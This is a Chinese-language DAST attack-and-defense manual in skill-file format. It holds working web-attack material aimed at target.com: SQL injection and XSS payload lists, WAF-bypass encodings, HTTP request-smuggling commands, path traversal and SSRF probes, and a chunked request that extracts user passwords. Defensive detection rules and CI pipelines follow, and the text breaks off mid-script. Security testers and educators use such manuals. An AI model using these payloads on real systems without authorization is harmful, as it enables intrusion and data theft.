---
name: devsecops-dast
description: >
  Complete manual for DAST in DevSecOps pipelines. Covers API fuzzing with RESTler, web scanning with Nikto/ZAP, Burp Suite testing methodology, WAF bypass techniques, and CI/CD integration. Includes attack methodology (fuzzing, WAF evasion, parameter tampering) and defense (DAST pipeline hardening, false positive management, scan gating).
domain: cybersecurity
subdomain: devsecops
tags: [dast, fuzzing, restler, zap, nikto, burp-suite, waf-bypass, api-testing, ci-cd, devsecops]
version: 2.0.0
---

# DAST 与动态安全测试 — 完整攻防手册

## 适用场景

- 对运行中的 Web 应用或 API 执行自动化漏洞扫描
- 将 DAST 集成到 CI/CD 流水线实现安全门禁
- 对 WAF 保护的资产进行绕过测试与漏洞发现
- Bug Bounty 场景下对 API 端点进行深度 Fuzzing

**不适用场景**：静态代码分析 — 参见 `devsecops-sast`；容器镜像扫描 — 参见 `container-security-scanning`；基础设施扫描 — 参见 `vulnerability-scanning`。

## 前置条件

- Web 应用安全基础（OWASP Top 10）
- HTTP 协议深入理解（方法、头部、编码）
- REST API 与 GraphQL 基础
- CI/CD 工具使用经验（GitHub Actions / GitLab CI / Jenkins）

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 目标表面侦察

```bash
# 快速指纹识别
curl -sI https://target.com | grep -iE 'server|x-powered-by|x-aspnet'
whatweb https://target.com -a 3

# 枚举隐藏参数
ffuf -u https://target.com/api/item -X POST \
  -H "Content-Type: application/json" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -d '{"FUZZ":"test"}' -mc all -fc 404

# API 端点发现
ffuf -u https://target.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
  -mc 200,201,301,401,403

# GraphQL 内省查询
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' | jq .
```

#### 1.2 WAF 检测与指纹

```bash
# WAF 指纹识别
wafw00f https://target.com
nmap -p 443 --script http-waf-detect target.com
nmap -p 443 --script http-waf-fingerprint target.com

# 触发 WAF 规则测试
curl -s "https://target.com/?id=1' OR '1'='1" -o /dev/null -w "%{http_code}"
curl -s "https://target.com/?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}"
curl -s "https://target.com/" -H "X-Forwarded-For: 127.0.0.1' OR 1=1--" -o /dev/null -w "%{http_code}"

# WAF 阻断页面分析
curl -sv "https://target.com/?id=1' UNION SELECT 1--" 2>&1 | grep -iE 'blocked|denied|forbidden|cloudflare|imperva|akamai|f5|x-waf'
```

#### 1.3 API 规格提取

```bash
# OpenAPI/Swagger 文档发现
for path in openapi.json swagger.json api-docs api/swagger.json v2/api-docs v3/api-docs .well-known/openapi.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
  [ "$code" = "200" ] && echo "[FOUND] $path ($code)"
done

# 从 OpenAPI 规格生成测试计划
curl -s https://target.com/openapi.json | jq '[.paths | to_entries[] | {path: .key, methods: (.value | keys)}]'
```

---

### 2. 利用与攻击

#### 2.1 API Fuzzing（RESTler）

```bash
# RESTler 安装与编译
git clone https://github.com/microsoft/restler-fuzzer.git
cd restler-fuzzer
python ./build-restler.py --dest_dir ./restler_bin

# 从 OpenAPI 规格编译 RESTler 语法
./restler_bin/restler/Restler compile \
  --api_spec /path/to/openapi.json \
  --restler_bin_dir ./restler_bin

# 基础烟雾测试（快速验证 API 健壮性）
./restler_bin/restler/Restler test \
  --restler_bin_dir ./restler_bin \
  --grammar_file Compile/grammar.py \
  --dictionary_file Compile/dict.json \
  --settings Compile/engine_settings.json \
  --target_ip target.com \
  --target_port 443 \
  --token_refresh_cmd "curl -s -X POST https://target.com/auth/token -d 'client_id=xxx&client_secret=yyy&grant_type=client_credentials' | jq -r '.access_token'" \
  --token_refresh_interval 300

# 完整 Fuzz（深度测试，可能持续数小时）
./restler_bin/restler/Restler fuzz \
  --restler_bin_dir ./restler_bin \
  --grammar_file Compile/grammar.py \
  --dictionary_file Compile/dict.json \
  --settings Compile/engine_settings.json \
  --target_ip target.com \
  --target_port 443 \
  --time_budget 4h \
  --token_refresh_cmd "curl -s -X POST https://target.com/auth/token -d 'client_id=xxx&client_secret=yyy&grant_type=client_credentials' | jq -r '.access_token'" \
  --token_refresh_interval 300

# 带自定义 fuzzing 字典
cat > custom_dict.json << 'DICT'
{
  "restler_fuzzable_string": ["' OR '1'='1", "{{7*7}}", "../../../etc/passwd", "${7*7}"],
  "restler_fuzzable_datetime": ["1970-01-01T00:00:00Z", "2099-12-31T23:59:59Z"],
  "restler_fuzzable_int": [-2147483648, 0, 2147483647, 9999999999],
  "restler_fuzzable_uuid4": ["00000000-0000-0000-0000-000000000000", "ffffffff-ffff-ffff-ffff-ffffffffffff"],
  "restler_custom_payload": ["admin", "root", "test", "user@evil.com"]
}
DICT

# 结果分析
python -c "
import json
with open('Fuzz/network.testing.random.testing/logs/mutated_requests.txt') as f:
    for line in f:
        req = json.loads(line)
        if req.get('response_code') in [500, 502, 503]:
            print(f'[CRASH] {req[\"method\"]} {req[\"path\"]} -> {req[\"response_code\"]}')
"
```

#### 2.2 Bug Bounty API Fuzzing

```bash
# 高效 API 端点模糊测试
ffuf -u https://target.com/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,401,403,500 -t 50 -rate 100

# 参数污染测试
for param in id user_id account_id order_id; do
  echo "[*] Testing $param"
  curl -s "https://target.com/api/v1/resource?${param}=1&${param}=2" | jq .
  curl -s "https://target.com/api/v1/resource?${param}=1%00" | jq .
  curl -s "https://target.com/api/v1/resource?${param}=1%27" | jq .
done

# HTTP 方法篡改
for method in GET POST PUT PATCH DELETE OPTIONS TRACE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $method https://target.com/api/v1/users/1)
  echo "[$method] -> $code"
done

# 批量赋值（Mass Assignment）测试
curl -s -X POST https://target.com/api/v1/users \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test","email":"test@test.com","role":"admin","is_admin":true}'

# IDOR 批量检测
for i in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    https://target.com/api/v1/users/$i)
  [ "$code" = "200" ] && echo "[LEAK] /users/$i accessible"
done

# GraphQL 批量查询滥用
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"},{"query":"{user(id:3){email}}"}]'
```

#### 2.3 WAF 绕过技术

```
+------------------------------------------------------------------+
|                    WAF 绕过决策树                                  |
+------------------------------------------------------------------+
|  Payload 被拦截?                                                  |
|  ├── 否 -> 直接使用                                               |
|  └── 是 -> 尝试编码绕过                                           |
|       ├── URL 双重编码                                            |
|       │   ' -> %27 -> %2527                                       |
|       │   < -> %3C -> %253C                                       |
|       ├── HTML 实体编码                                           |
|       │   <script> -> &#60;script&#62;                            |
|       │   <script> -> \x3cscript\x3e                             |
|       ├── Unicode / UTF-8 变体                                    |
|       │   ' -> %u0027 / %ca%27                                    |
|       │   < -> %c0%ae (overlong)                                  |
|       └── 大小写混合                                               |
|           <script> -> <ScRiPt> / <sCrIpT>                        |
|  仍然被拦截?                                                      |
|  ├── 换行 / 注释注入                                              |
|  │   <script> -> <scr\nipt>                                      |
|  │   UNION SELECT -> UN/**/ION SEL/**/ECT                       |
|  ├── 分块传输编码                                                  |
|  │   Transfer-Encoding: chunked                                   |
|  ├── HTTP/2 Smuggling                                             |
|  │   H2C 升级 / 连接共生                                          |
|  └── 参数污染                                                     |
|      ?id=1&id=UNION SELECT (WAF 检查第一个，后端取最后一个)       |
+------------------------------------------------------------------+
```

```bash
# === SQL 注入 WAF 绕过 ===
# 内联注释绕过
curl -s "https://target.com/?id=1 /*!UNION*/ /*!SELECT*/ 1,2,3--"

# 编码绕过
curl -s "https://target.com/?id=1%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%201,2,3--"

# 分块传输绕过（使用 Burp 或手动构造）
printf 'POST /api/search HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n4\r\nid=1\r\n17\r\n UNION SELECT 1,2,3--\r\n0\r\n\r\n' | openssl s_client -connect target.com:443 -quiet

# === XSS WAF 绕过 ===
# 事件处理器替代
curl -s "https://target.com/?q=<img/src=x onerror=alert(1)>"
curl -s "https://target.com/?q=<svg/onload=alert(1)>"
curl -s "https://target.com/?q=<details open ontoggle=alert(1)>"

# JavaScript 协议变体
curl -s "https://target.com/?q=<a href=\"java\tscript:alert(1)\">click</a>"
curl -s "https://target.com/?q=<a href=\"&#x6A;avascript:alert(1)\">click</a>"

# 无括号执行
curl -s "https://target.com/?q=<script>alert\`1\`</script>"
curl -s "https://target.com/?q=<script>throw/onerror=alert,{}</script>"

# === 路径遍历 WAF 绕过 ===
# 编码变体
curl -s "https://target.com/file?path=....//....//....//etc/passwd"
curl -s "https://target.com/file?path=..%252f..%252f..%252fetc/passwd"
curl -s "https://target.com/file?path=/etc/./passwd"

# === HTTP 请求走私 ===
# CL.TE 走私
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nFoo: x' | openssl s_client -connect target.com:443 -quiet

# TE.CL 走私
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' | openssl s_client -connect target.com:443 -quiet
```

---

### 3. 工具使用

#### 3.1 OWASP ZAP 自动化

```bash
# === ZAP API 扫描（Headless，适合 CI/CD）===

# 方法一：ZAP Docker 容器 + API 扫描
docker run -t --rm -v $(pwd):/zap/wrk:rw \
  owasp/zap2docker-stable zap-api-scan.py \
  -t https://target.com/openapi.json \
  -f openapi \
  -r zap-report.html \
  -w zap-report.md \
  -J zap-report.json \
  -z "-config api.disablekey=true" \
  -T 60

# 方法二：ZAP 基线扫描（快速）
docker run -t --rm -v $(pwd):/zap/wrk:rw \
  owasp/zap2docker-stable zap-baseline.py \
  -t https://target.com \
  -r baseline-report.html \
  -w baseline-report.md \
  -j \
  -I \
  -T 30

# 方法三：ZAP 全量爬取扫描
docker run -t --rm -v $(pwd):/zap/wrk:rw \
  owasp/zap2docker-stable zap-full-scan.py \
  -t https://target.com \
  -r full-report.html \
  -w full-report.md \
  -J full-report.json \
  -z "-config spider.maxDuration=10 -config spider.threadCount=10" \
  -T 120

# === ZAP Automation Framework（推荐，配置驱动）===
cat > zap-automation.yaml << 'ZAPCONF'
env:
  contexts:
    - name: target-app
      urls:
        - https://target.com
      includePaths:
        - https://target.com/api/.*
      excludePaths:
        - https://target.com/logout
        - https://target.com/static/.*
      authentication:
        method: bearerToken
        parameters:
          bearerToken: "${AUTH_TOKEN}"
      sessionManagement:
        method: cookie
      users:
        - name: api-user
          credentials:
            bearerToken: "${AUTH_TOKEN}"
  parameters:
    failOnError: true
    progressToStdout: true

jobs:
  - type: passiveScan-config
    parameters:
      maxAlertsPerRule: 10
      scanOnlyInScope: true

  - type: spider
    parameters:
      context: target-app
      user: api-user
      maxDuration: 5
      maxChildren: 20

  - type: spiderAjax
    parameters:
      context: target-app
      maxDuration: 3

  - type: activeScan
    parameters:
      context: target-app
      user: api-user
      maxRuleDurationInMins: 5
      maxScanDurationInMins: 30
      threadPerHost: 4
    policyDefinition:
      scanRules:
        - id: 40012    # SQL Injection
          strength: HIGH
          threshold: LOW
        - id: 40018    # SQL Injection MySQL
          strength: HIGH
        - id: 40014    # Path Traversal
          strength: HIGH
        - id: 40034    # Server Side Request Forgery
          strength: HIGH
        - id: 10202    # Absence of Anti-CSRF Tokens
          threshold: MEDIUM
        - id: 10038    # Content Security Policy
          threshold: LOW

  - type: report
    parameters:
      template: traditional-html
      reportDir: /zap/wrk/
      reportFile: zap-final-report.html
      reportTitle: DAST Security Report
ZAPCONF

# 运行 Automation Framework
docker run -t --rm -v $(pwd):/zap/wrk:rw \
  -e AUTH_TOKEN="$TOKEN" \
  owasp/zap2docker-stable zap.sh -cmd \
  -autorun /zap/wrk/zap-automation.yaml
```

#### 3.2 Nikto Web 扫描

```bash
# 基础扫描
nikto -h https://target.com -o nikto-report.html -Format html

# 全面扫描（所有插件）
nikto -h https://target.com \
  -Tuning 0123456789abcde \
  -o nikto-full.html -Format html \
  -timeout 10 -maxtime 1800s

# 特定测试类型
# -Tuning: 0=文件上传, 1=有趣文件, 2=配置错误, 3=信息泄露,
#          4=XSS, 5=SQL注入, 6=认证, 7=远程检索, 8=命令执行,
#          9=DoS(慎用), a=绕过, b=软件版本, c=遗留CGI
nikto -h https://target.com -Tuning 134568ab -o nikto-focused.html

# 使用代理（通过 Burp 联动）
nikto -h https://target.com -useproxy http://127.0.0.1:8080

# 特定端口和 SSL
nikto -h target.com -p 443 -ssl -o nikto-ssl.html

# 批量扫描
cat targets.txt | while read target; do
  nikto -h "$target" -o "nikto-${target//[:\/]/_}.html" -Format html -maxtime 600s &
done
wait
```

#### 3.3 Burp Suite 测试工作流

```
+------------------------------------------------------------------+
|                Burp Suite 测试方法论                               |
+------------------------------------------------------------------+
| 1. 代理配置                                                       |
|    ├── 浏览器设置代理 -> 127.0.0.1:8080                           |
|    ├── 安装 Burp CA 证书 (http://burp/cert)                       |
|    └── 上游代理链（多层测试）                                      |
|                                                                    |
| 2. 被动侦察                                                       |
|    ├── Proxy -> HTTP History（流量浏览）                           |
|    ├── Target -> Site Map（站点地图）                              |
|    └── 自动爬取：Dashboard -> New Scan -> Crawl and Audit         |
|                                                                    |
| 3. 主动测试                                                       |
|    ├── Intruder -> 爆破/Fuzz                                      |
|    ├── Repeater -> 手动验证                                        |
|    ├── Sequencer -> 随机性分析                                     |
|    └── Decoder -> 编解码                                           |
|                                                                    |
| 4. 自动扫描                                                       |
|    ├── Scanner -> Active Scan（全面漏洞扫描）                      |
|    ├── Scanner -> Live Active Scan（实时被动扫描）                 |
|    └── Issue Activity -> 结果审查                                  |
|                                                                    |
| 5. 高级功能                                                        |
|    ├── Macro（会话管理/CSRF Token 自动刷新）                       |
|    ├── Session Handling Rules                                      |
|    ├── Match and Replace（自动修改请求）                            |
|    └── Extensions（BApp Store 插件）                               |
+------------------------------------------------------------------+
```

```bash
# === Burp Suite Headless（CI/CD 集成）===

# Burp Suite Professional 命令行扫描
java -jar burpsuite_pro.jar \
  --project-file=scan-project.burp \
  --config-file=scan-config.json \
  --unpause-spider-and-scanner \
  --headless

# Burp REST API 配置
# 1. 启动 Burp 并启用 REST API
java -jar burpsuite_pro.jar --project-file=ci-scan.burp \
  --config=burp-ci-config.json

# 2. 通过 API 触发扫描
curl -s -X POST http://127.0.0.1:1337/v0.1/scan \
  -H "Content-Type: application/json" \
  -d '{
    "urls": ["https://target.com"],
    "scope": {
      "include": [{"protocol": "https", "host": "target.com"}]
    },
    "scan_configurations": ["Default"]
  }'

# 3. 查询扫描结果
curl -s http://127.0.0.1:1337/v0.1/report?issue_type=high | jq .

# === Burp Intruder 有效载荷列表 ===
# SQL 注入 Fuzz
cat > sqli-payloads.txt << 'SQLI'
' OR '1'='1
' OR '1'='1'--
' OR '1'='1' /*
" OR "1"="1
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
1; DROP TABLE users--
1 OR 1=1
1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
admin'--
1' WAITFOR DELAY '0:0:5'--
SQLI

# XSS Fuzz
cat > xss-payloads.txt << 'XSS'
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
<data onmouseover=alert(1)>test</data>
{{7*7}}
${7*7}
#{7*7}
XSS
```

#### 3.4 自定义 API Fuzzing 脚本

```python
#!/usr/bin/env python3
"""通用 API Fuzzer - 支持从 OpenAPI 规格自动生成测试用例"""
import requests, json, sys, itertools
from urllib.parse import urljoin

TARGET = "https://target.com"
TOKEN = "Bearer YOUR_TOKEN"
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

# Fuzz 数据集
FUZZ_STRINGS = {
    "sqli": ["' OR '1'='1", "1; DROP TABLE", "' UNION SELECT NULL--"],
    "xss": ["<script>alert(1)</script>", "{{7*7}}", "${7*7}"],
    "path": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"],
    "ssrf": ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/"],
    "overflow": ["A" * 1000, "A" * 10000, "A" * 100000],
    "type_confusion": [True, False, 0, -1, 999999, None, [], {}],
}

def load_openapi(spec_path):
    """从 OpenAPI 规格提取端点"""
    with open(spec_path) as f:
        spec = json.load(f)
    endpoints = []
    base = spec.get("servers", [{}])[0].get("url", TARGET)
    for path, methods in spec.get("paths", {}).items():
        for method, details in methods.items():
            if method in ("get", "post", "put", "patch", "delete"):
                params = [p["name"] for p in details.get("parameters", []) if p.get("in") == "query"]
                body_schema = details.get("requestBody", {}).get("content", {}).get("application/json", {}).get("schema", {})
                endpoints.append({
                    "method": method.upper(),
                    "path": path,
                    "params": params,
                    "body_schema": body_schema
                })
    return base, endpoints

def fuzz_endpoint(base, ep):
    """对单个端点执行 Fuzz 测试"""
    url = urljoin(base + "/", ep["path"].lstrip("/"))
    results = []
    for category, payloads in FUZZ_STRINGS.items():
        for payload in payloads:
            try:
                # Query 参数 Fuzz
                if ep["params"]:
                    params = {p: str(payload) for p in ep["params"]}
                    r = requests.request(ep["method"], url, params=params, headers=HEADERS, timeout=10)
                    if r.status_code >= 500:
                        results.append(f"[500+] {ep['method']} {url} param={category} -> {r.status_code}")
                # Body Fuzz
                if ep["method"] in ("POST", "PUT", "PATCH") and ep.get("body_schema"):
                    body = {k: payload for k in ep["body_schema"].get("properties", {})}
                    r = requests.request(ep["method"], url, json=body, headers=HEADERS, timeout=10)
                    if r.status_code >= 500:
                        results.append(f"[500+] {ep['method']} {url} body={category} -> {r.status_code}")
                    if r.status_code == 200 and any(s in r.text for s in ["error", "stack", "trace", "exception"]):
                        results.append(f"[LEAK] {ep['method']} {url} body={category} -> info disclosure")
            except Exception as e:
                results.append(f"[ERROR] {ep['method']} {url} {category}: {str(e)[:80]}")
    return results

if __name__ == "__main__":
    spec_file = sys.argv[1] if len(sys.argv) > 1 else "openapi.json"
    base, endpoints = load_openapi(spec_file)
    print(f"[*] Loaded {len(endpoints)} endpoints from {spec_file}")
    all_results = []
    for ep in endpoints:
        findings = fuzz_endpoint(base, ep)
        all_results.extend(findings)
        for f in findings:
            print(f)
    print(f"\n[*] Total findings: {len(all_results)}")
```

---

### 4. 绕过技术

#### 4.1 高级 WAF 规避

```bash
# === 分块传输编码绕过 ===
# Python 脚本自动构造分块请求
python3 << 'PYEOF'
import socket, ssl, time

def chunked_request(host, path, body):
    """构造分块传输请求以绕过 WAF"""
    chunks = []
    # 将恶意 payload 分割为多个 chunk
    for i in range(0, len(body), 4):
        chunk = body[i:i+4]
        chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
    chunks.append("0\r\n\r\n")

    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Connection: close\r\n\r\n"
    ) + "".join(chunks)

    ctx = ssl.create_default_context()
    with socket.create_connection((host, 443)) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.send(request.encode())
            return ssock.recv(4096).decode()

# 测试 SQL 注入绕过
payload = "id=1' UNION SELECT username,password FROM users--"
print(chunked_request("target.com", "/api/search", payload))
PYEOF

# === HTTP/2 Smuggling ===
# 使用 h2c 升级绕过 WAF
curl -sv --http2 \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
  -H "Connection: Upgrade, HTTP2-Settings" \
  "https://target.com/api/admin"

# === Unicode 规范化绕过 ===
# 利用 Unicode 规范化差异
curl -s "https://target.com/?q=%E2%80%98"   # 左单引号 -> 可能被规范化为 '
curl -s "https://target.com/?q=%EF%BC%9C"   # 全角 < -> 可能被规范化为 <
curl -s "https://target.com/?q=%C0%AE"      # Overlong encoding for '.'

# === HTTP 参数污染 ===
# 多参数值测试（WAF 可能只检查第一个）
curl -s "https://target.com/search?q=normal%20content&q=<script>alert(1)</script>"
curl -s "https://target.com/api/item?id=1&id=2+UNION+SELECT+1,2,3--"
```

#### 4.2 扫描器规避

```bash
# Nikto 规避扫描
nikto -h https://target.com \
  -Tuning 123456789ab \
  -evasion 1    # 1=随机编码, 2=目录自引用(/./), 4=前置随机字符串, 8=使用TAB代替空格

# ZAP 自定义 User-Agent 和延迟
# 在 ZAP Automation Framework 中添加：
cat > zap-stealth.yaml << 'STEALTH'
jobs:
  - type: passiveScan-config
    parameters:
      maxAlertsPerRule: 5
  - type: requestor
    parameters:
      sleep: 2000  # 每请求间隔 2 秒
    requests:
      - url: https://target.com
        method: GET
        headers:
          User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          Accept: "text/html,application/xhtml+xml"
          Accept-Language: "en-US,en;q=0.9"
STEALTH

# Nuclei 模板化扫描（替代方案，更灵活）
nuclei -u https://target.com -t cves/ -t vulnerabilities/ -t misconfiguration/ \
  -rate-limit 50 -timeout 10 -retries 2 \
  -o nuclei-results.txt \
  -severity critical,high,medium
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 Fuzzing 攻击检测

```yaml
# Splunk 检测规则 — API Fuzzing 行为识别
name: API Fuzzing Detection
index: web_proxy, api_gateway
sourcetype: access_combined

search: |
  index=api_gateway
  | stats count as requests, dc(uri_path) as unique_paths,
    dc(http_method) as methods, stdev(response_time) as response_dev
    by src_ip, uri_path
  | where unique_paths > 50 OR methods > 4 OR response_dev > 5000
  | where requests > 100
  | eval risk_score=case(
      unique_paths > 100, 90,
      unique_paths > 50 AND methods > 4, 80,
      response_dev > 5000, 70,
      1=1, 50
    )
  | where risk_score >= 70
  | table _time, src_ip, requests, unique_paths, methods, risk_score

# Sigma 规则 — 检测 WAF 绕过尝试
title: WAF Bypass Attempt Detected
status: experimental
logsource:
  category: webserver
  product: waf
detection:
  selection_encoded:
    request_uri|contains:
      - '%2527'
      - '%253C'
      - '%252f..'
      - '%c0%ae'
      - '%uff0e'
  selection_chunked:
    request_headers|contains:
      - 'Transfer-Encoding: chunked'
      - 'Transfer-Encoding:chunked'
  selection_smuggle:
    - request_headers|contains: 'Content-Length'
      request_headers|contains: 'Transfer-Encoding'
  selection_unicode:
    request_uri|re: '.*%u[0-9a-fA-F]{4}.*'
  condition: selection_encoded or selection_chunked or selection_smuggle or selection_unicode
level: high
tags:
  - attack.t1190
  - attack.initial_access

# ModSecurity / OWASP CRS 自定义规则
# 检测 Fuzzing 行为模式
SecRule REQUEST_URI "@rx (%2527|%253C|%c0%ae|%uff0e)" \
  "id:100001,phase:1,deny,status:403,msg:'Double Encoding WAF Bypass Detected',severity:CRITICAL"

SecRule REQUEST_HEADERS:Transfer-Encoding "@streq chunked" \
  "id:100002,phase:1,deny,status:403,msg:'Chunked Transfer Encoding Request',chain"
  SecRule REQUEST_HEADERS:Content-Length "!@streq "" \
    "msg:'Possible HTTP Request Smuggling'"

# 速率限制 — 基于 IP 和路径的 Fuzzing 检测
SecAction "id:100003,phase:1,pass,initcol:ip=%{REMOTE_ADDR},nolog"
SecRule IP:DOS_COUNTER "@gt 100" \
  "id:100004,phase:1,deny,status:429,msg:'Rate Limit Exceeded - Possible Fuzzing'"
```

#### 5.2 Nginx WAF 规则

```nginx
# Nginx + ModSecurity 基础 WAF 配置
server {
    listen 443 ssl;
    server_name target.com;

    # ModSecurity 启用
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;

    # 速率限制区域
    limit_req_zone $binary_remote_addr zone=api_limit:10m rate=30r/m;
    limit_req zone=api_limit burst=10 nodelay;

    # 自定义安全头部
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Content-Security-Policy "default-src 'self'" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    location /api/ {
        # API 特定限制
        limit_req_zone $binary_remote_addr zone=api_strict:10m rate=10r/m;
        limit_req zone=api_strict burst=5;

        # 阻止无 User-Agent 的请求（扫描器特征）
        if ($http_user_agent = "") {
            return 403;
        }

        # 仅允许特定 HTTP 方法
        limit_except GET POST PUT PATCH DELETE OPTIONS {
            deny all;
        }

        proxy_pass http://backend;
    }
}
```

---

### 6. 修复方案

#### 6.1 CI/CD DAST 集成配置

```yaml
# === GitHub Actions — 完整 DAST Pipeline ===
name: DAST Security Scan
on:
  push:
    branches: [main, develop]
  schedule:
    - cron: '0 2 * * 1'  # 每周一凌晨 2 点
  workflow_dispatch:

jobs:
  zap-scan:
    runs-on: ubuntu-latest
    name: OWASP ZAP Scan
    steps:
      - uses: actions/checkout@v4

      - name: ZAP API Scan
        uses: zaproxy/action-api-scan@v0.12.0
        with:
          target: 'https://staging.target.com/openapi.json'
          format: 'openapi'
          rules_file_name: 'zap-rules.tsv'
          cmd_options: '-a -j'
          allow_address_warmup: true
          token: ${{ secrets.AUTH_TOKEN }}
        env:
          ZAP_AUTH_HEADER: "Authorization"
          ZAP_AUTH_HEADER_VALUE: "Bearer ${{ secrets.AUTH_TOKEN }}"

      - name: Upload ZAP Report
        uses: actions/upload-artifact@v4
        with:
          name: zap-report
          path: report_html.html

      - name: Check ZAP Results
        run: |
          # 解析 JSON 报告，检查是否有高危漏洞
          HIGH_COUNT=$(python3 -c "
          import json
          with open('report_json.json') as f:
              data = json.load(f)
          high = [a for a in data.get('site',[{}])[0].get('alerts',[])
                  if a.get('riskcode','0') in ('3','3.0')]
          print(len(high))
          ")
          echo "High severity findings: $HIGH_COUNT"
          if [ "$HIGH_COUNT" -gt 0 ]; then
            echo "::error::$HIGH_COUNT high severity vulnerabilities found"
            exit 1
          fi

  restler-fuzz:
    runs-on: ubuntu-latest
    name: RESTler API Fuzz
    steps:
      - uses: actions/checkout@v4

      - name: Run RESTler
        run: |
          # 使用 RESTler Docker 镜像
          docker run --rm -v $(pwd):/workspace \
            restler/restler \
            restler \
            --target_ip staging.target.com \
            --target_port 443 \
            --grammar_file /workspace/grammar.py \
            --dictionary_file /workspace/dict.json \
            --token_refresh_cmd "curl -s -X POST https://staging.target.com/auth/token -d 'client_id=${{ secrets.CLIENT_ID }}&client_secret=${{ secrets.CLIENT_SECRET }}&grant_type=client_credentials' | jq -r '.access_token'" \
            --time_budget 1h

      - name: Analyze RESTler Results
        run: |
          python3 analyze_restler_logs.py Fuzz/ | tee restler-findings.txt
          CRASHES=$(grep -c "BUG" restler-findings.txt || echo 0)
          if [ "$CRASHES" -gt 0 ]; then
            echo "::error::$CRASHES bugs found by RESTler"
            exit 1
          fi
```

```yaml
# === GitLab CI — DAST 集成 ===
stages:
  - test
  - dast

include:
  - template: DAST.gitlab-ci.yml

variables:
  DAST_WEBSITE: "https://staging.target.com"
  DAST_AUTH_URL: "https://staging.target.com/login"
  DAST_USERNAME: "$TEST_USER"
  DAST_PASSWORD: "$TEST_PASSWORD"
  DAST_AUTH_VERIFICATION_URL: "https://staging.target.com/dashboard"
  DAST_BROWSER_SCAN: "true"
  DAST_FULL_SCAN_ENABLED: "true"
  DAST_FULL_SCAN_TIMEOUT_MAX: "7200"

dast_zap_scan:
  stage: dast
  image: owasp/zap2docker-stable
  script:
    - zap-baseline.py -t $DAST_WEBSITE -r baseline.html -J baseline.json || true
    - |
      HIGH=$(python3 -c "
      import json
      with open('baseline.json') as f:
          data = json.load(f)
      print(len([a for a in data.get('site',[{}])[0].get('alerts',[])
                if a.get('riskcode','0') in ('3','3.0')]))
      ")
      echo "High findings: $HIGH"
      [ "$HIGH" -gt 0 ] && exit 1 || exit 0
  artifacts:
    paths:
      - baseline.html
      - baseline.json
    when: always
  rules:
    - if: $CI_PIPELINE_SOURCE == "schedule"
    - if: $CI_COMMIT_BRANCH == "main"
```

#### 6.2 ZAP 误报管理

```bash
# ZAP 规则文件 — 标记已知误报
# 格式: IGNORE|WARN|FAIL rule_id url_pattern
cat > zap-rules.tsv << 'RULES'
IGNORE	10038	.*\.css$
IGNORE	10038	.*\.js$
IGNORE	10038	.*\.png$
IGNORE	10038	.*\.woff2$
IGNORE	10021	.*			# X-Content-Type-Options (已知处理)
WARN	10017	.*			# 应用程序错误披露
WARN	10041	.*			# X-Frame-Options (已知使用 CSP)
FAIL	40012	.*			# SQL 注入 — 始终失败
FAIL	40014	.*			# 路径遍历 — 始终失败
FAIL	40034	.*			# SSRF — 始终失败
FAIL	10202	.*			# CSRF Token 缺失 — 始终失败
RULES

# 自动化误报基线生成
docker run --rm -v $(pwd):/zap/wrk:rw \
  owasp/zap2docker-stable zap-baseline.py \
  -t https://target.com \
  -J baseline.json \
  -I  # 忽略所有结果，仅生成基线

# 从基线生成排除规则
python3 << 'PYEOF'
import json
with open('baseline.json') as f:
    data = json.load(f)

alerts = data.get('site', [{}])[0].get('alerts', [])
with open('zap-ignore-rules.tsv', 'w') as out:
    for alert in alerts:
        if alert.get('riskcode', '0') in ('0', '1'):  # 信息/低危
            plugin_id = alert.get('pluginid', '0')
            for instance in alert.get('instances', []):
                url = instance.get('uri', '.*')
                out.write(f"IGNORE\t{plugin_id}\t{url}\n")
